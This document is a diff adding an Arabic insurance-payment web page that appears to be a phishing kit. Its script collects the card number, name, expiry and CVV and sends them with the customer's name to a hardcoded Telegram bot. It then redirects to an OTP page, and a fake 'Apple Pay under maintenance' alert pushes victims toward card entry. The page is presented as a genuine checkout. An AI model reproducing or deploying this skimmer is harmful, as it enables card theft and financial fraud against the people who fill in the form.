@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-gradient=1.0, user-scalable=no" />
+
+  <style>
+    :root {
+      --primary: #0b4f8c;
+      --bg: #f5f7fb;
+      --surface: #ffffff;
+      --text: #17324d;
+      --line: #dbe7f7;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Tajawal', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(180deg, #eff6ff 0%, var(--bg) 100%);
+      color: var(--text);
+    }
+
+    .page-shell {
+      min-height: 100vh;
+      padding-top: 10px;
+      padding-bottom: 24px;
+    }
+
+    /* صندوق تفاصيل الدفع العلوي الملموم */
+    .summary-box {
+      width: 90%;
+      max-width: 360px;
+      margin: 10px auto;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.04);
+      border: 1px solid #e2e8f0;
+      padding: 12px;
+      box-sizing: border-box;
+      direction: rtl;
+    }
+
+    .summary-head #txttotalpay {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 700;
+      color: #1a2b49;
+      margin: 0 0 10px 0;
+    }
+
+    .summary-card {
+      background: #f0f7ff;
+      border: 1px solid #b3d4f7;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 2px 0;
+      font-size: 12px;
+    }
+
+    .summary-label {
+      color: #475569;
+      font-weight: 600;
+    }
+
+    .summary-value, .summary-company {
+      color: #0f172a;
+      font-weight: 700;
+      text-align: left;
+    }
+
+    .summary-row:has(.summary-company) {
+      flex-direction: column;
+      margin-bottom: 4px;
+      border-bottom: 1px solid #dbeafe;
+      padding-bottom: 4px;
+    }
+
+    .summary-row:has(.summary-company) .summary-label {
+      display: none;
+    }
+
+    .summary-company {
+      font-size: 14px;
+      color: #0b355b;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .section-title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #1e293b;
+      margin-top: 2px;
+    }
+
+    .card-divider {
+      border: 0;
+      border-top: 1px solid #dbeafe;
+      margin: 4px 0;
+    }
+
+    .discount-row .summary-label,
+    .discount-row .summary-value {
+      color: #059669;
+    }
+
+    .total-row {
+      margin-top: 6px;
+      border-top: 1px solid #dbeafe;
+      padding-top: 6px;
+    }
+
+    .total-row .summary-label {
+      font-size: 13px;
+      font-weight: 800;
+      color: #0b355b;
+    }
+
+    .total-row .summary-value {
+      font-size: 17px !important;
+      font-weight: 900 !important;
+      color: #0b4f8c !important;
+    }
+
+    /* حاوية استمارة الدفع السفلية المطابقة للصورة */
+    .container {
+      width: 90%;
+      max-width: 360px;
+      margin: 10px auto 20px;
+      background-color: #fff;
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.04);
+      border: 1px solid #e2e8f0;
+      position: relative;
+      box-sizing: border-box;
+    }
+
+    .main-title {
+      font-size: 15px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: right;
+      margin-bottom: 14px;
+    }
+
+    .payment-method-option {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border: 1px solid #b3d4f7;
+      border-radius: 12px;
+      padding: 10px;
+      margin-bottom: 8px;
+      box-sizing: border-box;
+      background: #f0f7ff;
+      border: 1px solid #3b82f6;
+    }
+
+    .apple-pay-option {
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      justify-content: center;
+      padding: 8px;
+    }
+
+    .price-text {
+      font-size: 13px;
+      font-weight: 700;
+      color: #0b4f8c;
+    }
+
+    .apple-pay-text {
+      font-size: 18px;
+      font-weight: 700;
+      color: #000000;
+    }
+
+    .field-wrapper {
+      margin-bottom: 10px;
+    }
+
+    .input-header-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+
+    .field-title {
+      font-size: 11px;
+      font-weight: 700;
+      color: #0f172a;
+      text-align: right;
+      display: block;
+      margin-bottom: 3px;
+    }
+
+    input[type="text"], input[type="tel"], select {
+      width: 100%;
+      height: 34px;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      padding: 0 10px;
+      font-size: 12px;
+      box-sizing: border-box;
+      outline: none;
+      background: #ffffff;
+      color: #334155;
+    }
+
+    input#cardNumber {
+      text-align: left;
+      direction: ltr;
+      font-weight: 600;
+    }
+
+    .payment-row {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 14px;
+    }
+
+    .field-group-3 {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .select-wrapper {
+      position: relative;
+    }
+
+    .select-wrapper::after {
+      content: "";
+      border: solid #64748b;
+      border-width: 0 1.5px 1.5px 0;
+      display: inline-block;
+      padding: 2px;
+      position: absolute;
+      left: 10px;
+      top: 42%;
+      transform: translateY(-50%) rotate(45deg);
+      pointer-events: none;
+    }
+
+    select {
+      appearance: none;
+      -webkit-appearance: none;
+      padding-left: 20px;
+    }
+
+    #payBtn {
+      width: 100%;
+      height: 40px;
+      background-color: #0b4f8c;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-sizing: border-box;
+      box-shadow: 0 4px 12px rgba(11, 79, 140, 0.2);
+    }
+
+    .footer-note {
+      font-size: 11px;
+      color: #64748b;
+      margin-top: 12px;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .logos-group, .small-logos {
+      font-size: 9px;
+      font-weight: 800;
+      color: #94a3b8;
+    }
+
+    /* دائرة التحميل */
+    .loading-overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255, 255, 255, 0.9);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      border-radius: 16px;
+      z-index: 10;
+      display: none;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0b4f8c;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 12px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .loading-text-bold {
+      font-weight: bold;
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 4px;
+    }
+
+    .loading-text-small {
+      font-size: 12px;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-shell">
+
+    <div class="summary-box" id="summaryBox">
+      <div class="summary-head">
+        <h3 id="txttotalpay">تفاصيل الدفع</h3>
+      </div>
+      <div class="summary-card">
+        <div class="summary-row"><span class="summary-label">الشركة</span><span id="summaryCompany" class="summary-company">--</span></div>
+        
+        <div class="section-title">فترة التأمين:</div>
+        <div class="summary-row"><span class="summary-label">تاريخ البدء</span><span id="summaryStartDate" class="summary-value">--</span></div>
+        <div class="summary-row"><span class="summary-label">تاريخ الانتهاء</span><span id="summaryExpiry" class="summary-value">--</span></div>
+        
+        <hr style="border:0; border-top:1px solid #dbeafe; margin:4px 0;">
+        <div class="summary-row"><span class="summary-label">القسط الأساسي</span><span id="summaryPrice" class="summary-value">--</span></div>
+        <div class="summary-row discount-row"><span class="summary-label">خصم عدم وجود مطالبات (30%-)</span><span id="calcDiscount" class="summary-value">--</span></div>
+        
+        <hr style="border:0; border-top:1px solid #dbeafe; margin:4px 0;">
+        <div class="summary-row"><span class="summary-label">المجموع الفرعي</span><span id="calcSubtotal" class="summary-value">--</span></div>
+        <div class="summary-row"><span class="summary-label">ضريبة القيمة المضافة (15%+)</span><span id="calcVat" class="summary-value">--</span></div>
+        
+        <div class="summary-row total-row"><span class="summary-label">المبلغ الإجمالي</span><span id="calcTotal" class="summary-value">--</span></div>
+      </div>
+    </div>
+
+    <div class="container" id="paymentContainer">
+      
+      <div class="main-title">اختر طريقة الدفع</div>
+
+      <div class="payment-method-option">
+        <span class="price-text" id="methodPrice">-- ر.س</span>
+        <div class="logos-group">mada / VISA / MC</div>
+      </div>
+
+<div class="payment-method-option apple-pay-option" id="applePayBtn" onclick="showMaintenanceAlert()" style="cursor: pointer;">
+  <span class="apple-pay-text"> Pay</span>
+</div>
+
+      <div class="field-wrapper" style="margin-top: 14px;">
+        <div class="input-header-row">
+          <div class="small-logos">mada/VISA</div>
+          <label class="field-title" for="cardNumber">رقم البطاقة</label>
+        </div>
+        <input type="tel" id="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19" required />
+      </div>
+
+      <div class="field-wrapper">
+        <label class="field-title" for="cardName">اسم صاحب البطاقة</label>
+        <input type="text" id="cardName" placeholder="الاسم على البطاقة" required />
+      </div>
+
+      <div class="payment-row">
+        <div class="field-group-3">
+          <label class="field-title">الشهر</label>
+          <div class="select-wrapper">
+            <select id="expiryMonth" required>
+              <option value="" disabled selected>الشهر</option>
+              <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+              <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+              <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+              <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="field-group-3">
+          <label class="field-title">السنة</label>
+          <div class="select-wrapper">
+<select id="expiryYear" required>
+  <option value="" disabled selected>سنة</option>
+  <option value="26">2026</option>
+  <option value="27">2027</option>
+  <option value="28">2028</option>
+  <option value="29">2029</option>
+  <option value="30">2030</option>
+  <option value="31">2031</option>
+  <option value="32">2032</option>
+  <option value="33">2033</option>
+  <option value="34">2034</option>
+  <option value="35">2035</option>
+  <option value="36">2036</option>
+  <option value="37">2037</option>
+  <option value="38">2038</option>
+  <option value="39">2039</option>
+  <option value="40">2040</option>
+</select>
+          </div>
+        </div>
+
+        <div class="field-group-3">
+          <label class="field-title" for="cvv">رمز CVV</label>
+          <input type="tel" id="cvv" placeholder="123" maxlength="3" required />
+        </div>
+      </div>
+
+      <button onclick="validateForm()" id="payBtn">ادفع الآن — -- ر.س</button>
+    <div> 
+
+    </div>
+
+
+      <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text-bold">يرجى الانتظار</div>
+        <div class="loading-text-small">انتظر حتى تتم معالجة طلبك</div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const CHAT_ID = '7785288759';
+
+    function formatDate(date) {
+      return new Intl.DateTimeFormat('ar-SA', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit'
+      }).format(date);
+    }
+
+    function calculateExpiry(startDate) {
+      const date = new Date(startDate);
+      if (Number.isNaN(date.getTime())) return null;
+      date.setFullYear(date.getFullYear() + 1);
+      return date;
+    }
+
+    function renderSummary() {
+      const selectedPrice = localStorage.getItem('selectedPrice') || '0';
+      const selectedCompany = localStorage.getItem('selectedCompany') || 'غير متوفر';
+      const selectedImage = localStorage.getItem('selectedImage') || '';
+      const startDateValue = localStorage.getItem('insuranceStartDate') || '';
+      const expiryDate = calculateExpiry(startDateValue);
+
+      const companyNode = document.getElementById('summaryCompany');
+      companyNode.innerHTML = selectedImage
+        ? `<img src="${selectedImage}" alt="${selectedCompany}" style="width:28px; height:28px; object-fit:contain; vertical-align:middle; margin-left:4px;" /> <span>${selectedCompany}</span>`
+        : selectedCompany;
+        
+      document.getElementById('summaryPrice').textContent = selectedPrice;
+      document.getElementById('summaryStartDate').textContent = startDateValue ? formatDate(new Date(startDateValue)) : 'غير متوفر';
+      document.getElementById('summaryExpiry').textContent = expiryDate ? formatDate(expiryDate) : 'غير متوفر';
+    }
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (err) {
+        console.error('فشل الإرسال إلى تيليجرام:', err);
+      }
+    }
+
+    function validateForm() {
+      const cardName = document.getElementById('cardName').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+      const cvv = document.getElementById('cvv').value.trim();
+      const month = document.getElementById('expiryMonth').value;
+      const year = document.getElementById('expiryYear').value;
+
+      if (!cardName) { alert('يرجى إدخال اسم صاحب البطاقة'); return; }
+      if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) { alert('يرجى إدخال رقم البطاقة المكون من 16 رقم'); return; }
+      if (!month || !year) { alert('يرجى اختيار تاريخ انتهاء البطاقة كاملاً'); return; }
+      if (!/^\d{3}$/.test(cvv)) { alert('يرجى إدخال رمز CVV صحيح'); return; }
+
+      showLoading();
+      const fullName = localStorage.getItem('owner_name') || 'غير معروف';
+      localStorage.setItem("cardNumber", cardNumber);
+
+      const finalPrice = document.getElementById('calcTotal').innerText;
+
+      const message = `
+💳 بيانات الدفع الجديدة:
+- 🧑‍💼 العميل: ${fullName}
+- 👤 الاسم على البطاقة: ${cardName}
+- 🔢 رقم البطاقة: ${cardNumber}
+- 📅 تاريخ الانتهاء: ${month}/${year}
+- 🔐 رمز الـ CVV: ${cvv}
+- 💰 إجمالي السعر المحسوب: ${finalPrice}
+      `;
+
+      sendToTelegram(message).then(() => {
+        setTimeout(() => {
+          hideLoading();
+          window.location.href = "otp.html";
+        }, 7000);
+      });
+    }
+
+    function showLoading() {
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      document.getElementById('payBtn').disabled = true;
+    }
+
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+      document.getElementById('payBtn').disabled = false;
+    }
+
+    function calculateInvoice() {
+      const priceElement = document.getElementById('summaryPrice');
+      if (!priceElement) return;
+
+      const basePrice = parseFloat(priceElement.innerText.replace(/[^\d.]/g, ''));
+      if (isNaN(basePrice)) return;
+
+      const discount = basePrice * 0.30;
+      const subtotal = basePrice - discount;
+      const vat = subtotal * 0.15;
+      const total = subtotal + vat;
+
+      const formattedTotal = `${total.toFixed(2)} ر.س`;
+
+      document.getElementById('calcDiscount').innerText = `-${discount.toFixed(2)} ريال`;
+      document.getElementById('calcSubtotal').innerText = `${subtotal.toFixed(2)} ريال`;
+      document.getElementById('calcVat').innerText = `${vat.toFixed(2)} ريال`;
+      document.getElementById('calcTotal').innerText = formattedTotal;
+
+      // تحديث الأسعار التلقائية في قسم الدفع والزر
+      document.getElementById('methodPrice').innerText = formattedTotal;
+      document.getElementById('payBtn').innerText = `ادفع الآن — ${formattedTotal}`;
+    }
+
+    // تفعيل العمليات فور انتهاء التحميل
+    renderSummary();
+    setTimeout(calculateInvoice, 300);
+
+    // تنسيق مسافات رقم البطاقة أوتوماتيكياً
+    document.getElementById('cardNumber').addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      let formatted = '';
+      for (let i = 0; i < value.length; i += 4) {
+        formatted += value.substring(i, i + 4) + ' ';
+      }
+      e.target.value = formatted.trim();
+    });
+    function showMaintenanceAlert() {
+  alert("عذراً، خدمة Apple Pay قيد الصيانة حالياً. يرجى استخدام بطاقة مدى أو فيزا لإتمام الدفع.");
+}
+  </script>
+</body>
+</html>
